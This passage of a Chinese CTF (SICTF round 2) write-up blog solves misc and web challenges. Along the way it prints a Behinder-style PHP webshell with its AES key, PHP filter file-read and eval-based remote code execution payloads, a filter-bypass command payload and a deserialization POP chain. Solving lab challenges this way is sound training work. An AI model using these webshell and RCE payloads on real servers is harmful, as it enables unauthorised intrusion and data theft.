Image.<span class="title function_ invoke__">open</span>(<span class="string">&#x27;image.png&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取图像的宽度和高度</span></span><br><span class="line">width, height = image.size</span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历每个像素</span></span><br><span class="line"><span class="keyword">for</span> y in <span class="title function_ invoke__">range</span>(height):</span><br><span class="line">    <span class="keyword">for</span> x in <span class="title function_ invoke__">range</span>(width):</span><br><span class="line">        <span class="comment"># 获取像素的RGB值</span></span><br><span class="line">        r, g, b = image.<span class="title function_ invoke__">getpixel</span>((x, y))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 判断RGB值并输出相应字符</span></span><br><span class="line">        <span class="keyword">if</span> r == <span class="number">46</span>:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&#x27;.&#x27;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        elif r == <span class="number">33</span>:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&#x27;!&#x27;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        elif r == <span class="number">63</span>:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&#x27;?&#x27;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> g == <span class="number">46</span>:</span><br><span class="line">                <span class="keyword">print</span>(<span class="string">&#x27;.&#x27;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        elif g == <span class="number">33</span>:</span><br><span class="line">                <span class="keyword">print</span>(<span class="string">&#x27;!&#x27;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        elif g == <span class="number">63</span>:</span><br><span class="line">                <span class="keyword">print</span>(<span class="string">&#x27;?&#x27;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> b == <span class="number">46</span>:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&#x27;.&#x27;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        elif b == <span class="number">33</span>:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&#x27;!&#x27;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        elif b == <span class="number">63</span>:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&#x27;?&#x27;</span>,end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></div></figure>

<blockquote>
<p>………………!?!!.?………………?.?!.?….!.?…….!?!!.?!!!!!!?.?!.?!!!.!!!!!!!!!!!!!.?………!?!!.?……..?.?!.?..!.?…….!?!!.?!!!!!!?.?!.?!!!!!!!!!!!.?……………!?!!.?…………..?.?!.?……..!.?……………..!?!!.?!!!!!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!!!!!!!!!…!…….!.!!!!!!!.?………….!?!!.?…………?.?!.?……………………!…..!.?………….!?!!.?!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!!!!!!!!!!!…..!.!!!!!!!!!!!!!!!!!.?……………!?!!.?…………..?.?!.?…………..!.!!!!!.?……………!?!!.?!!!!!!!!!!!!!!?.?!.?!!!……………..!.?…….!?!!.?!!!!!!?.?!.?!!!!!!!……………!.?………….!?!!.?…………?.?!.?………………….!…..!.!.?……………!?!!.?!!!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!.?……………!?!!.?…………..?.?!.?……!.?………….!?!!.?!!!!!!!!!!!!?.?!.?!!!!!!!!!.!!!!!!!!!!!!!!!!!!!………….!.!!!!!!!!!!!!!!!!!!!………..!.!………….!.!!!!!!!!!!!!!!!!!………..!.?……………!?!!.?…………..?.?!.?!.!!!!!.!!!!!…….!.!!!.?………….!?!!.?!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!!!!!.!.?……………..!?!!.?…………….?.?!.?…………!.?.</p>
</blockquote>
<p>Short Ook</p>

        <h3 id="baby-zip">
          <a href="#baby-zip" class="heading-link"><i class="fas fa-link"></i></a><a href="#baby-zip" class="headerlink" title="baby_zip"></a>baby_zip</h3>
      <figure class="highlight sh"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bkcrack -C flag.zip -c flag.png -x 0 89504E470D0A1A0A0000000D49484452</span><br><span class="line">bkcrack -C flag.zip -c flag.png -k 6424c164 7c334afd f99666e5 -d flag.png</span><br></pre></td></tr></table></div></figure>

<p>010查看flag在最后</p>

        <h3 id="Easy-Shark">
          <a href="#Easy-Shark" class="heading-link"><i class="fas fa-link"></i></a><a href="#Easy-Shark" class="headerlink" title="Easy_Shark"></a>Easy_Shark</h3>
      <p>AES冰蝎3流量</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;2295d22e2d70888f&quot;</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>]=<span class="variable">$key</span>;</span><br><span class="line">        <span class="variable">$post</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="variable">$t</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line">                <span class="variable">$post</span>=<span class="variable">$t</span>(<span class="variable">$post</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$post</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">                             <span class="variable">$post</span>[<span class="variable">$i</span>] = <span class="variable">$post</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">                            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">                <span class="variable">$post</span>=<span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$post</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="variable">$arr</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$post</span>);</span><br><span class="line">    <span class="variable">$func</span>=<span class="variable">$arr</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="variable">$params</span>=<span class="variable">$arr</span>[<span class="number">1</span>];</span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$p</span></span>) </span>&#123;<span class="keyword">eval</span>(<span class="variable">$p</span>.<span class="string">&quot;&quot;</span>);&#125;&#125;</span><br><span class="line">    @<span class="title function_ invoke__">call_user_func</span>(<span class="keyword">new</span> <span class="title function_ invoke__">C</span>(),<span class="variable">$params</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">key = <span class="string">&#x27;2295d22e2d70888f&#x27;</span></span><br></pre></td></tr></table></div></figure>

<p>解冰蝎流量</p>
<p><img src="/2023/09/10/SICTF-2nd/1/hexoblog/source/image/image-20230913194824995.png"></p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TGLBOMSJNSRAJAZDEZXGHSJNZWHG</span><br></pre></td></tr></table></div></figure>

<p><img src="/2023/09/10/SICTF-2nd/1/hexoblog/source/image/image-20230913194834595.png"></p>
<p><img src="/2023/09/10/SICTF-2nd/1/hexoblog/source/image/image-20230913194844075.png"></p>
<p>变异凯撒</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_ invoke__">decrypt_string</span>(ciphertext, offsets):</span><br><span class="line">    decrypted_string = <span class="string">&quot;&quot;</span></span><br><span class="line">    offset_index = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> char in ciphertext:</span><br><span class="line">        offset = offsets[offset_index] % <span class="number">26</span></span><br><span class="line">        decrypted_char_code = (<span class="title function_ invoke__">ord</span>(char) - <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;A&#x27;</span>) - offset) % <span class="number">26</span> + <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">        decrypted_char = <span class="title function_ invoke__">chr</span>(decrypted_char_code)</span><br><span class="line">        decrypted_string += decrypted_char</span><br><span class="line"></span><br><span class="line">        offset_index = (offset_index + <span class="number">1</span>) % <span class="title function_ invoke__">len</span>(offsets)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> decrypted_string</span><br><span class="line"></span><br><span class="line">ciphertext = <span class="string">&quot;TGLBOMSJNSRAJAZDEZXGHSJNZWHG&quot;</span></span><br><span class="line">offsets = [<span class="number">1</span>, <span class="number">50</span>, <span class="number">61</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">20</span>, <span class="number">63</span>, <span class="number">41</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    decrypted_string = <span class="title function_ invoke__">decrypt_string</span>(ciphertext, offsets)</span><br><span class="line">    <span class="keyword">print</span>(decrypted_string)</span><br></pre></td></tr></table></div></figure>

<p>FLAG：SICTFSHUMUISAGOODBOYYYYYYYYY</p>

        <h3 id="fast-morse">
          <a href="#fast-morse" class="heading-link"><i class="fas fa-link"></i></a><a href="#fast-morse" class="headerlink" title="fast_morse"></a>fast_morse</h3>
      <p><img src="/2023/09/10/SICTF-2nd/1/hexoblog/source/image/image-20230913194855104.png"></p>
<p>morse解密</p>
<p>得到falg</p>
<p><img src="/2023/09/10/SICTF-2nd/1/hexoblog/source/image/image-20230913194905075.png"></p>
<p>变成小写</p>

        <h3 id="QR-QR-QR">
          <a href="#QR-QR-QR" class="heading-link"><i class="fas fa-link"></i></a><a href="#QR-QR-QR" class="headerlink" title="QR_QR_QR"></a>QR_QR_QR</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> pyzbar.pyzbar <span class="keyword">import</span> decode</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置日志级别为调试模式</span></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建图片函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_image</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        lines = file.readlines()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 生成图片数组</span></span><br><span class="line">    image_array = [[<span class="number">255</span> <span class="keyword">if</span> bit == <span class="string">&#x27;1&#x27;</span> <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">for</span> bit <span class="keyword">in</span> line.strip()] <span class="keyword">for</span> line <span class="keyword">in</span> lines]</span><br><span class="line">    image_array = np.array(image_array, dtype=np.uint8)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 保存为图片</span></span><br><span class="line">    plt.imsave(<span class="string">&#x27;output.png&#x27;</span>, image_array, cmap=<span class="string">&#x27;gray&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取二维码函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_qr_code</span>(<span class="params">image_path</span>):</span><br><span class="line">    image = Image.<span class="built_in">open</span>(image_path)</span><br><span class="line">    decoded_objects = decode(image)</span><br><span class="line">    <span class="keyword">for</span> obj <span class="keyword">in</span> decoded_objects:</span><br><span class="line">        <span class="keyword">return</span> obj.data.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接服务器</span></span><br><span class="line">conn = remote(<span class="string">&#x27;210.44.151.51&#x27;</span>, <span class="number">10365</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 从服务器接收数据</span></span><br><span class="line">        data = conn.recvuntil(<span class="string">&#x27;Please Decrypt this QR code:&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 将数据保存到文本文件</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            file.write(data.decode())</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 从文本文件创建图片</span></span><br><span class="line">        create_image(<span class="string">&#x27;1.txt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 读取图片中的二维码</span></span><br><span class="line">        code = read_qr_code(<span class="string">&#x27;output.png&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(code)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 发送二维码到服务器</span></span><br><span class="line">        conn.sendline(<span class="built_in">str</span>(code))</span><br><span class="line">        conn.recvline()</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="comment"># 关闭文件</span></span><br><span class="line">        file.close()</span><br></pre></td></tr></table></div></figure>


        <h3 id="问卷调查">
          <a href="#问卷调查" class="heading-link"><i class="fas fa-link"></i></a><a href="#问卷调查" class="headerlink" title="问卷调查"></a>问卷调查</h3>
      <p>第三道就是flag</p>
<p>SICTF{SICTF_Round3_will_do_even_better!}</p>

        <h1 id="WEB">
          <a href="#WEB" class="heading-link"><i class="fas fa-link"></i></a><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1>
      
        <h3 id="签到-Include">
          <a href="#签到-Include" class="heading-link"><i class="fas fa-link"></i></a><a href="#签到-Include" class="headerlink" title="[签到]Include"></a>[签到]Include</h3>
      <p>利用伪协议可直接读到flag</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?SICTF=php://<span class="built_in">filter</span>/convert.base64-encode/resource=/flag</span><br></pre></td></tr></table></div></figure>


        <h3 id="Baby-PHP">
          <a href="#Baby-PHP" class="heading-link"><i class="fas fa-link"></i></a><a href="#Baby-PHP" class="headerlink" title="Baby_PHP"></a>Baby_PHP</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">$query = $_SERVER[&#x27;QUERY_STRING&#x27;];</span><br><span class="line"></span><br><span class="line">if (preg_match(&#x27;/_|%5f|\.|%2E/i&#x27;, $query)) &#123;</span><br><span class="line">    die(&#x27;You are Hacker!&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">if($_GET[&#x27;k_e_y&#x27;] !==&#x27;123&#x27; &amp;&amp; preg_match(&#x27;/^123$/&#x27;,$_GET[&#x27;k_e_y&#x27;]))&#123;</span><br><span class="line">    echo(&quot;You are will Win!&lt;br&gt;&quot;);</span><br><span class="line">    if(isset($_POST[&#x27;command&#x27;]))&#123;</span><br><span class="line">        $command = $_POST[&#x27;command&#x27;];</span><br><span class="line">        if(!preg_match(&quot;/\~|\`|\@|\#|\\$|\%|\&amp;|\*|\（|\）|\-|\+|\=|\&#123;|\&#125;|\[|\]|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;,$command))&#123;</span><br><span class="line">            eval($command);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            echo(&quot;You are Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo(&quot;K_e_y is Errors!&quot;);</span><br><span class="line">&#125;K_e_y is Errors!</span><br></pre></td></tr></table></div></figure>

<p>代码开始会对输入的字符串进行正则匹配，跟_有关的url编码之类的全部过滤</p>
<p>可以用空格或者.代替_,.又被过滤了，用了空格，后面一个简单的若比较换行符绕过</p>
<p>后面cmd一个无数字字母rce</p>
<p>可见ctfshow  web40的题解</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?k%20e%20y=123%0a</span><br><span class="line">command=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></div></figure>


        <h3 id="RCE">
          <a href="#RCE" class="heading-link"><i class="fas fa-link"></i></a><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line">highlight_file(__FILE__); </span><br><span class="line">$code = $_POST[&#x27;code&#x27;]; </span><br><span class="line">$code = str_replace(&quot;(&quot;,&quot;hacker&quot;,$code); </span><br><span class="line">$code = str_replace(&quot;.&quot;,&quot;hacker&quot;,$code); </span><br><span class="line">eval($code); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>

<p>借鉴宏爷文章</p>
<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://blog.csdn.net/qq_63928796/article/details/127963079">https://blog.csdn.net/qq_63928796/article/details/127963079</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=<span class="keyword">echo</span> <span class="variable">$_POST</span>[<span class="number">1</span>];&amp;<span class="number">1</span>=cat /f*</span><br></pre></td></tr></table></div></figure>


        <h3 id="我全都要">
          <a href="#我全都要" class="heading-link"><i class="fas fa-link"></i></a><a href="#我全都要" class="headerlink" title="我全都要"></a>我全都要</h3>
      <p>POP</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pop</span> = <span class="string">&#x27;233333333&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$i</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nogame</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/233333333/&quot;</span>,<span class="variable">$this</span>-&gt;pop))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;这是一道签到题，不能让新生一直做不出来遭受打击&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">game</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;扣1送地狱火&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;i = <span class="string">&quot;1&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=\&#x27;R.jpg\&#x27;&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;nogame-&gt;<span class="title function_ invoke__">love</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;必须执行&quot;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Aec</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$girl</span> = <span class="string">&#x27;QNKCDZO&#x27;</span> ;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$boy</span> = <span class="string">&#x27;240610708&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;I also want to fall in love&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;girl != <span class="variable language_">$this</span>-&gt;boy &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;girl) == <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;boy))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;Aec-&gt;<span class="title function_ invoke__">game</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">P</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$MyLover</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;有对象我会在这打CTF???看我克隆一个对象！&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$name</span> != <span class="string">&quot;game&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;打游戏去，别想着对象了&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;MyLover = <span class="keyword">clone</span> <span class="keyword">new</span> B;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt;pop = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt;pop -&gt;Aec = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt;pop -&gt;Aec -&gt; nogame = <span class="keyword">new</span> <span class="title function_ invoke__">P</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></div></figure>

<p>payload</p>
<p>解析时第一个[会解析为下划线</p>
